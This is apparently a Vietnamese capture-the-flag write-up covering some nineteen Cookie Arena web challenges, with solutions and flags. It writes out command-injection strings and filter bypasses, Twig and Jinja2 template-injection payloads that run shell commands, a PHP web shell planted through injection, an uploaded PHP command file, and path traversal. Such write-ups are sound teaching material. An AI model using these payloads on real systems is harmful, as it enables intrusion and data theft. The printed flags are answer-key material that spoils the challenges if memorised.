# Web

## Content

- [HTTP Request Content-Length](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#http-request-content-length)
- [HTTP Request Transfer Encoding](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#http-request-transfer-encoding)
- [PHP Executor Playground](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#php-executor-playground)
- [Hello Twig](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#hello-twig)
- [NSLookup (Level 1)](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#nslookup-level-1)
- [NSLookup (Level 2)](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#nslookup-level-2)
- [NSLookup (Level 3)](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#nslookup-level-3)
- [Mass Assignment Profile](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#mass-assignment-profile)
- [Baby HTTP Method](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#baby-http-method)
- [What is your name?](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#what-is-your-name)
- [I Known Your IP](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#i-known-your-ip)
- [eViewer](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#eviewer)
- [Cookie Comic](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#cookie-comic)
- [My Deploy](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#my-deploy)
- [COMB](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#comb)
- [System Monitor](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#system-monitor)
- [Baby Simple Go CURL](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#baby-simple-go-curl)
- [Where do you come from](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#where-do-you-come-from)
- [Empty Execution](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#empty-execution)
### HTTP Request Content-Length
Challenge:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image1.png?raw=true)

**Flag: CHH{HTTPContentLength_eb4e5beb118f2242c00d142ede3bb218}**

### HTTP Request Transfer Encoding

Challenge:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image2.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image3.png?raw=true)

**Flag: CHH{HTTPTransferEncoding_d11e934c7546bacaa97b2c826878d80b}**

### PHP Executor Playground

Challenge:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image4.png?raw=true)

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image5.png?raw=true)

Xem website:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image6.png?raw=true)

Thử string là `admin` và function là `strlen`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image7.png?raw=true)

Thử string là `admin` và function là `strtoupper`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image8.png?raw=true)

Thử string là `ADMIN` và function là `strtolower`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image9.png?raw=true)

Thử string là `admin` và function là `addslashes`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image10.png?raw=true)

Thử string là `admin` và function là `print_r`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image11.png?raw=true)

Thử string là `admin` và function là `exec`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image12.png?raw=true)

Thử string là `admin` và function là `passthru`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image13.png?raw=true)

Thử string là `admin` và function là `shell_exec`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image14.png?raw=true)

Thử string là `admin` và function là `escapeshellarg`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image15.png?raw=true) 

Thử string là `admin` và function là `escapeshellcmd`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image16.png?raw=true)

Trong PHP, hàm `shell_exec` sẽ thực hiện 1 lệnh từ shell và trả về toàn bộ kết quả dưới dạng chuỗi. Hàm `exec` cũng thực hiện 1 lệnh từ shell nhưng chỉ trả về dòng cuối cùng của kết quả dưới dạng chuỗi. Hàm `passthru` thực hiện 1 lệnh từ shell và xuất trực tiếp kết quả đến browser (hoặc thiết bị đầu ra khác).

Thử nhập chuỗi `find / -name *.txt` và dùng hàm `shell_exec`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image17.png?raw=true)

Click `Execute` và có đầu ra như sau:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image18.png?raw=true)

->Tìm được file `/flag.txt`.

Thử nhập chuỗi `cat /flag.txt` và dùng hàm `passthru`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image19.png?raw=true)

**Flag: CHH{PHPFunct1Ons_986675c073d696bff00160b9e301232e}**

### Hello Twig

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image20.png?raw=true)

Start challenge:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image21.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image24.png?raw=true)

Đoạn mã được thử thách cung cấp:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image25.png?raw=true)

Đoạn mã sử dụng `Twig Template Engine` để hiển thị nội dung HTML động. Để ý có hàm `run` trong `PHP` – thực thi shell command:

    $twig->addFunction(new \Twig\TwigFunction('run', function ($cmd) {
        return shell_exec($cmd);
    }));

->Cho phép chạy lệnh shell từ trong template (rất nguy hiểm nếu không kiểm soát!)

Đoạn mã này có khả năng bị khai thác lỗ hổng `Server-Side Template Injection (SSTI)` — nếu người dùng có thể `điều khiển nội dung template được render`. 

->Khi nào xảy ra `SSTI`?

- Ứng dụng sử dụng một `template engine` (như `Twig`, `Jinja2`,...).
- Dữ liệu từ người dùng được truyền vào `template engine` mà không kiểm soát.
- Kẻ tấn công có thể chèn `template expression` vào (ví dụ: `{{ 7 * 7 }}`, `{{ run('ls') }}`...).

->Vấn đề trong đoạn code:

Giả sử biến `$templates` được khởi tạo từ input người dùng như sau:

    $templates = [
        'hello' => $_GET['tpl'] 
    ];

Rồi đoạn này:

    $message = $twig->render("hello");

Lúc này, nếu người dùng truy cập URL như:

    http://yourdomain.com/index.php?tpl={{ run('ls') }}

->Nó sẽ thực thi lệnh hệ thống trên server thông qua hàm `run()` mà đã `addFunction` vào `Twig`, dẫn tới `Remote Code Execution (RCE)`.

Tiếp tục nhận thấy khi nhập 1 giá trị `Your name` bất kỳ và click `Submit`, sẽ có tham số `name` xuất hiện trên URL, có thể lợi dụng tham số này để chèn payload. Truy cập "PayloadsAllTheThings/Server Side Template Injection
/PHP.md" để tìm kiếm payload:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image26.png?raw=true)

Thử dùng payload `{{['cat\x20/etc/passwd']|filter('system')}}`, thay thành `{{['cat\x20/flag.txt']|filter('system')}}`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image22.png?raw=true)

->Tìm được Flag.

Nộp flag:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image23.png?raw=true)

**Flag: CHH{SSTI_PHP_S1mpl3Twig_39e344b86ac999e092b87b3429386eed}**

### NSLookup (Level 1)

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image27.png?raw=true)

Truy cập website:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image28.png?raw=true)

Tôi thử nhập tên miền `google.com` và click `LOOKUP`, kết quả trả về là thông tin của tên miền:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image29.png?raw=true)

Dựa vào mô tả thử thách, liên quan đến lỗ hổng `Command Injection`, tôi đã thử nhập `google.com && id`, kết quả trả về cho thấy website có khả năng dính lỗ hổng `Command Injection`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image30.png?raw=true)

Tiếp theo tôi thử nhập `google.com && cat /flag.txt`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image31.png?raw=true)

**Flag: CHH{S1mpl3C0mmandInj3ct1on_3d8f1302ef289248496527315e5f6271}**
### NSLookup (Level 2)
![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image32.png?raw=true)

Truy cập website:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image33.png?raw=true)

Tôi thử nhập `google.com`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image34.png?raw=true)

Tiếp theo tôi thử nhập `google.com && id`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image35.png?raw=true)

Dựa vào phản hồi này, có vẻ ký tự `space` của tôi đã bị escape thành `\032` (giá trị ASCII cho ký tự `space`). Ý tưởng của tôi là sẽ bypass bộ lọc này bằng những cách nối lệnh khác. 

Sau khi thử một loạt payload, tôi đã tìm được payload `'; cat /flag.txt; #` - đây là cách đóng mở quote lại rồi chèn lệnh, như vậy payload cuối cùng sẽ là `google.com'; cat /flag.txt; #`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image36.png?raw=true)

### NSLookup (Level 3)

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image37.png?raw=true)

Truy cập website:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image38.png?raw=true)

Xem source code của trang web, tôi thấy rằng có một filter được áp dụng ở đây:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image39.png?raw=true)

Đây là filter được viết bằng JS, để tạm thời vô hiệu hóa filter này, tôi đã `Disable JS` trong dev tools:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image40.png?raw=true)

Sau khi thử một loạt các cách bypass bộ lọc câu lệnh của thử thách ,tôi đã tìm được payload sau: 

    google.com'; find / -type f 2>/dev/null | grep flag; #

Payload này sẽ giúp tôi dò file theo pattern được thử thách cung cấp `/flagXXXX.txt`. Kết quả trả về từ website:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image41.png?raw=true)

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image42.png?raw=true)

=> Tôi đã tìm được file chứa flag theo đúng định dạng: `/flagbsEQj.txt`. Để đọc nội dung file này, ý tưởng của tôi là mã hóa base64 nội dung file rồi decode lại:

    google.com'; base64 /flagbsEQj.txt; #

Kết quả là tôi đã tìm được nội dung flag được mã hóa base64:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image43.png?raw=true)

Decode nội dung này và tôi tìm được flag:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image44.png?raw=true)
### Mass Assignment Profile

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image45.png?raw=true)

Truy cập trang web:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image46.png?raw=true)

Thử login vào tài khoản `alice`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image47.png?raw=true)

Tôi thử sửa Full Name thành `admin`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image48.png?raw=true)

Kiểm tra request này:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image49.png?raw=true)

Ý tưởng của tôi là thêm vào request body trường `role` với giá trị là `admin` và đã tìm được flag.

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image50.png?raw=true)
### Baby HTTP Method
![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image51.png?raw=true)

Truy cập website:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image52.png?raw=true)

Thử click `click me for the flag`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image53.png?raw=true)

Xem source code:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image54.png?raw=true)

Dựa vào mô tả thử thách, tôi cần tìm endpoint ẩn, sau đó gửi PUT request đến endpoint này. Nhìn qua source code, tôi để ý tới `<!-- /src -->`. Thử truy cập `/src`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image55.png?raw=true)

=> Đã tìm được endpoint ẩn, tiếp theo tôi gửi PUT request đến endpoint này và tìm được flag:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image56.png?raw=true)
### What is your name?
![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image57.png?raw=true)

Tôi đã kiểm tra source code nhưng không có gì. Khi kiểm tra response khi refresh lại trang, tôi đã nghĩ đến lỗ hổng `SSTI`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image58.png?raw=true)

Tiếp theo, khi nội dung trang web là `Hello. What is your name?`. Ý tưởng của tôi là tôi sẽ gửi một request đến `/?name={{7*7}}` để kiểm tra trang web có dính `SSTI` thật không:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image59.png?raw=true)

=> Như vậy đã xác định được trang web dính lỗ hổng `SSTI`. Tôi sẽ chèn payload `{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image60.png?raw=true)
### I Known Your IP

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image61.png?raw=true)

Truy cập website:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image62.png?raw=true)

Đoạn code được thử thách cung cấp: 

    from flask import Flask, request, render_template_string

    app = Flask(__name__)

    @app.route("/")
    def home():    
        try:
            client_ip = request.headers.getlist("X-Forwarded-For")[0].split(':')[0]
        except:
            client_ip = None
        if not client_ip:
            client_ip = request.remote_addr
        message = f"This page is being accessed from the remote address: {client_ip}"    
        return render_template_string(message)
        ## Fix Server Side Template Injection
        # message = "This page is being accessed from the remote address: {{client_ip}}"
        # return render_template_string(message, client_ip=client_ip)

    if __name__ == "__main__":
        app.run(debug=True, host='0.0.0.0', port=1337)

Phân tích đoạn code này, tôi thấy rằng đoạn code `Flask` này có một lỗ hổng `Server-Side Template Injection` (SSTI) khá rõ ràng:

    client_ip = request.headers.getlist("X-Forwarded-For")[0].split(':')[0]

Lấy IP của client từ header `X-Forwarded-For` (nếu có), nếu không thì dùng `request.remote_addr`.

    message = f"This page is being accessed from the remote address: {client_ip}"
    return render_template_string(message)

Biến `message` là một `f-string` chứa giá trị có thể do người dùng kiểm soát (client_ip từ header), sau đó `message` được truyền trực tiếp vào `render_template_string()`.

Vì `render_template_string()` sử dụng `Jinja2` (template engine mặc định của Flask), tôi có thể thử thêm header `X-Forwarded-For: {{7*7}}` vào request để kiểm tra:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image63.png?raw=true)

Tiếp theo tôi thay giá trị của `X-Forwarded-For` thành `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}` và tìm được flag:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image64.png?raw=true)
### eViewer

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image65.png?raw=true)

Truy cập trang web:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image66.png?raw=true)

Tôi thử nhập file name là `../../../flag.txt` và tìm được flag:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image67.png?raw=true)
### Cookie Comic

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image68.png?raw=true)

Truy cập trang web:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image69.png?raw=true)

Kiểm tra source code, tôi tìm được đường dẫn tới những bức ảnh được hiển thị trên trang web:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image70.png?raw=true)

Truy cập link này:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image71.png?raw=true)

Tôi đã thử thay đổi đường dẫn này thành:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image72.png?raw=true)

Sau khi Enter, 1 file `image.php` được tự động tải về và nội dung file chính là flag:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image73.png?raw=true)

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image74.png?raw=true)
### My Deploy

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image77.png?raw=true)

Truy cập trang web:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image78.png?raw=true)

Trang web này có chức năng upload file zip và sẽ được tự động giải nén và lưu trong thư mục `/extracted`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image79.png?raw=true)

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image80.png?raw=true)

Tôi đã tạo 1 file `.php` với nội dung sau để tìm ra tên của file chứa flag:

    <?php echo shell_exec("find / -type f -name 'flag*.txt' 2>/dev/null"); ?>

Sau khi upload và truy cập vào file, tôi tìm được file chứa flag:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image75.png?raw=true)

Cuối cùng chỉ cần đọc nội dung file này để tìm ra flag:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image76.png?raw=true)
### COMB
![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image81.png?raw=true)

Truy cập trang web:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image83.png?raw=true)

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image82.png?raw=true)

Truy cập vào trang login:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image84.png?raw=true)

Sau khi thử tấn công `SQLi` nhưng không thành công, tôi thử truy cập `/robots.txt` và tìm được đường dẫn `/comb.php`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image85.png?raw=true)

Truy cập đường dẫn này:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image86.png?raw=true)

Tôi thử nhập vào email của John và tìm ra được mật khẩu:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image87.png?raw=true)

Sau khi login, website sẽ hiển thị flag:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image88.png?raw=true)
### System Monitor

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image89.png?raw=true)

Truy cập vào trang web:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image90.png?raw=true)

Tôi đã thử click vào các tính năng trong mục `System Management` nhưng không có gì xảy ra. 

Ở phần `Analyze Suspicious Traffic in Log File`, có thể thấy có những patterns mẫu mà website coi là đáng ngờ như `sql`, `ls`, `wget`,...

Thử click vào `Analyze`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image91.png?raw=true)

=> Như vậy, xác định được thử thách này là 1 dạng `OS command injection` và website sẽ lọc ra một số câu lệnh phổ biến. 

Tôi thử chèn câu lệnh `/?id` vào URL, sau đó kiểm tra request thì thấy đường dẫn đến log_file mà website sẽ đọc log: `log_file=/var/log/nginx/access.log`.

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image92.png?raw=true)

Tôi thử thay log_file thành `/etc/passwd`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image93.png?raw=true)

=> Thành công in ra `/etc/passwd`. Tiếp theo tôi thử `/etc/passwd;ls`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image94.png?raw=true)

Câu lệnh `ls` không được thực hiện, tôi đã thử một số câu lệnh khác như `id`, `echo` nhưng không thành công, tuy nhiên lệnh `sleep 5` thì thành công. Có thể chèn payload nhưng chỉ áp dụng với 1 số lệnh nhất định. 

Tiếp theo tôi thử chèn `echo "<?php system (\$_GET['cmd']); ?>" > shell.php` và gửi `POST` request `/shell.php/?cmd=ls`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image95.png?raw=true)

=> Thành công thực thi câu lệnh `ls`. Tiếp theo chỉ cần tìm và đọc file `flag.txt`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image96.png?raw=true)

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image97.png?raw=true)
### Baby Simple Go CURL

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image98.png?raw=true)

Truy cập trang web:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image99.png?raw=true)

Tôi thử nhập `https://line.me/en/` và nhận được thông báo:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image100.png?raw=true)

Phân tích đoạn code được thử thách cung cấp:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image101.png?raw=true)

`/flag/`: Sẽ chỉ trả về flag nếu request đến từ IP là `127.0.0.1`

Với gợi ý này, tôi thử nhập `http://127.0.0.1:1337/flag/`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image102.png?raw=true)

Vẫn thông báo lỗi, tiếp tục kiểm tra code, tôi tìm được:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image103.png?raw=true)

=> Request sẽ bị chặn nếu IP không phải `localhost` và URL chứa `flag`, `curl` hoặc `%`. 

Ý tưởng của tôi lúc này là thử chuyển hướng IP client đến địa chỉ IP cục bộ sử dụng `X-Forwarded-For` header:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image104.png?raw=true)

=> Base64 decode và có được flag.
### Where do you come from

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image105.png?raw=true)

Truy cập trang web:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image106.png?raw=true)

Dựa vào mô tả thử thách, có thể là gợi ý rằng server sẽ kiểm tra nguồn truy cập của request. Ý tưởng của tôi là thêm `Referer` header vào request và flag được trả về:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image107.png?raw=true)
### Empty Execution

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image108.png?raw=true)

Truy cập trang web:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image109.png?raw=true)

Phân tích đoạn code, tôi thấy rằng:
- Endpoint chính sẽ là `/run_command` (POST).
- Nhận một JSON chứa `command` và thực thi nó trên server
- Kiểm tra bảo mật:
    - Độ dài command phải >= 5 ký tự
    - Không cho phép `..` hoặc `/` trong command
    - Chỉ chạy file nếu có quyền `os.X_OK`

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image110.png?raw=true)

Sau khi thử một loạt các câu lệnh phổ biến như `ls`, `id`, `whoami` và tôi cũng kết hợp các câu lệnh lại thành như `ls; whoami` nhưng server vẫn không trả về gì, ý tưởng tiếp theo của tôi là sử dụng lệnh `.` - lệnh này sẽ thực thi file hiện tại (thường là `source .` trong shell), không làm gì nếu không có file `.`, nhưng không lỗi.

=> Payload của tôi sẽ là `. ; ls -al`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image111.png?raw=true)

=> Server đã trả về output của lệnh `ls -al`. Tiếp theo để đọc được `/flag.txt` với điều kiện ký tự `/` bị chặn. Ý tưởng của tôi là mã hóa base64 chuỗi `flag.txt`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image112.png?raw=true)

Sau đó lệnh cuối cùng của tôi sẽ là:

    cat `echo L2ZsYWcudHh0Cg== | base64 -d` 

Tương đương với lệnh `cat /flag.txt` và flag được trả về:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image113.png?raw=true)


























































